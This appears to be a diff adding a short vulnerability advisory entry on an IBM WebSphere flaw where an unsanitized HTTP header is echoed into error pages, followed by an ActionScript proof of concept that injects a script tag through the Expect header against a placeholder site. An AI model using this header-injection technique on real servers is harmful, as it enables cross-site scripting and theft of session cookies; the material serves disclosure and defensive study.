@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/26457/info
+
+IBM WebSphere Application Server is prone to a security weakness regarding an HTTP request header. The software fails to sanitize a certain HTTP header when the data is redirected to an error message.
+
+An attacker may exploit this issue to steal cookie-based authentication credentials and launch other attacks. 
+
+var req:LoadVars=new LoadVars();
+req.addRequestHeader("Expect",
+"<script>alert('gotcha!')</script>");
+req.send("http://www.target.site/","_blank","GET");
